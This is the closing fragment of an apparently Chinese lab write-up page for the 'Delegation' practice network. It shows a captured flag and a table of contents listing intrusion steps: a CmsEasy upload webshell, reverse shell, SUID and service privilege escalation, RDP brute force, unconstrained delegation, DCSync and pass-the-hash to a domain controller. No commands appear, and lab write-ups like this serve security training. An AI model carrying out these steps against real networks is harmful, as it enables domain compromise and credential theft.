style="color:#393A34"><span class="token plain">`+.|=|.+&#x27;`+.|=|.+&#x27; `+.|=|.+&#x27;`+.|=|.+&#x27; `+.|=|.+&#x27;`+.| |..|      |.+&#x27;      |.+&#x27;`+.|=|.+&#x27; `+.|  |.|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag03: flag{0183dc6b-9724-47a8-a32b-8a06f4ea0ef6}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Here is fileserver.xiaorang.lab, you might find something interesting on this host that can help you!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Yunjing/major/Delegation/index.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/Target-Machines-WriteUp/docs/Yunjing/major/Brute4Road/"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Brute4Road</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/Target-Machines-WriteUp/docs/Yunjing/major/Hospital/"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Hospital</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#入口点探测" class="table-of-contents__link toc-highlight">入口点探测</a></li><li><a href="#入口点-cmseasy-任意文件上传构建-webshell" class="table-of-contents__link toc-highlight">入口点 CmsEasy 任意文件上传构建 Webshell</a></li><li><a href="#入口点-反弹-shell--权限维持" class="table-of-contents__link toc-highlight">入口点 反弹 shell + 权限维持</a></li><li><a href="#入口点-suid-提权" class="table-of-contents__link toc-highlight">入口点 Suid 提权</a></li><li><a href="#flag---01" class="table-of-contents__link toc-highlight">flag - 01</a></li><li><a href="#入口点-建立中转枢纽" class="table-of-contents__link toc-highlight">入口点 建立中转枢纽</a></li><li><a href="#入口点-内网信息搜集" class="table-of-contents__link toc-highlight">入口点 内网信息搜集</a></li><li><a href="#17222445-xiaorangwin19-rdp-密码爆破" class="table-of-contents__link toc-highlight">172.22.4.45 XIAORANG\WIN19 RDP 密码爆破</a></li><li><a href="#17222445-xiaorangwin19-windows-服务提权" class="table-of-contents__link toc-highlight">172.22.4.45 XIAORANG\WIN19 Windows 服务提权</a></li><li><a href="#flag---02" class="table-of-contents__link toc-highlight">flag - 02</a></li><li><a href="#17222445-xiaorangwin19-抓取域内信息" class="table-of-contents__link toc-highlight">172.22.4.45 XIAORANG\WIN19 抓取域内信息</a></li><li><a href="#17222445-xiaorangwin19-非约束委派" class="table-of-contents__link toc-highlight">172.22.4.45 XIAORANG\WIN19 非约束委派</a></li><li><a href="#17222445-xiaorangwin19-票据文件直接-dcsync" class="table-of-contents__link toc-highlight">172.22.4.45 XIAORANG\WIN19 票据文件直接 DCSync</a></li><li><a href="#17222445-xiaorangwin19-导入票据直接-dcsync-获取域内哈希" class="table-of-contents__link toc-highlight">172.22.4.45 XIAORANG\WIN19 导入票据直接 DCSync 获取域内哈希</a></li><li><a href="#1722247-dc-使用-administrator-哈希登录-dc" class="table-of-contents__link toc-highlight">172.22.4.7 DC 使用 Administrator 哈希登录 DC</a></li><li><a href="#flag--04" class="table-of-contents__link toc-highlight">flag- 04</a></li><li><a href="#17222419-fileserverxiaoranglab-域内横向" class="table-of-contents__link toc-highlight">172.22.4.19 FILESERVER.xiaorang.lab 域内横向</a></li><li><a href="#flag---03" class="table-of-contents__link toc-highlight">flag - 03</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox 🇨🇳 Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>